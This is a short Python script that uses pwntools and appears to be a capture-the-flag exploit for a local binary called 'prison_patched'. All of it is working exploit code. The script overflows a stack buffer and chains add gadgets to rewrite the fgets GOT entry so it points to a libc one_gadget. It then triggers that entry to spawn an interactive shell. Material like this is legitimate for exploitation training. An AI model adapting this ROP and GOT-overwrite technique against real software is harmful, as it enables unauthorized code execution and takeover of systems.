#!/usr/bin/env python3

from pwn import *

exe = ELF("./prison_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

debug = lambda : gdb.attach(p, gdbscript = script)
sl = lambda a: p.sendline(a)

script = '''
b *0x40070E
'''

p = process("./prison_patched")
# = gdb.debug("./prison_patched", gdbscript = script)

pop_rbp = 0x0000000000400608
# 0x00000000004005cf : add bl, dh ; ret
add_bldh = 0x00000000004005cf
# 0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
add_gadget = 0x0000000000400668
fgets_got = exe.got['fgets']
fgets_plt = exe.plt['fgets']

offset = 0x6c842 # padding offset to one_gadget

payload = flat(
    b"A" * 0x20,
    p64(fgets_got + 0x3d), p64(add_bldh),
    p64(add_bldh) * 2,
    p64(add_gadget) * 2,
    p64(add_gadget), p64(fgets_plt),
    p64(offset), # rbx
    p64(fgets_got + 0x3d), # rbp
    p64(0), # r12
    p64(0), # r13
    p64(0x4141414141414141), # r14
    p64(add_gadget),
    p64(fgets_plt)
    )
sl(payload)

p.interactive()


